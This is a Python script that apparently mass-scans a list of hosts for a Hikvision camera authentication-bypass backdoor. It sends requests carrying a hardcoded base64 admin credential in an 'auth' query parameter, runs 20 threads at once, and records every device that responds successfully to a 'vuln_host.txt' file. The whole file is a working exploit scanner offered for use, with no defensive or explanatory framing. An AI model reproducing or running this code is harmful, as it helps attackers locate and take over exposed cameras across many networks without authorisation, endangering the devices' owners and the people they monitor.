import os, sys, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from host import host

BackdoorAuthArg = "auth=YWRtaW46MTEK"


class hikTester:
    def _isVulnerable(session, address):
        url = 'http://' + address['ip'] + ':' + str(address['port']) + '/security/users/1?' + BackdoorAuthArg
        try:
            response = session.get(url, timeout=5)
            return response.status_code == 200
        except requests.exceptions.RequestException:
            return False

    def hikTester(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        lines = open(path + '/host/up_host.txt', 'r').read().splitlines()
        addresses = []
        for line in lines:
            if not line.strip():
                continue
            try:
                addresses.append(host.Host.addressRegex(line))
            except AttributeError:
                continue
        total = len(addresses)
        vulnerable = []
        with requests.Session() as session:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(hikTester._isVulnerable, session, address): address for address in addresses}
                done = 0
                for future in as_completed(futures):
                    done += 1
                    percentage = (done / total) * 100 if total else 100
                    progressBar = int(percentage) / 5
                    sys.stdout.write("\r" + "[...] Loading   [%-20s] %.2f%%" % ('█' * int(progressBar), percentage))
                    sys.stdout.flush()
                    if future.result():
                        address = futures[future]
                        vulnerable.append(address['ip'] + ':' + str(address['port']))
        sys.stdout.write("\r" + "[!!!] Complete [%-20s] %.2f%%\n" % ('█' * 20, 100.00))
        if vulnerable:
            with open(path + '/host/vuln_host.txt', 'a') as host_vuln:
                host_vuln.write("\n".join(vulnerable) + "\n")
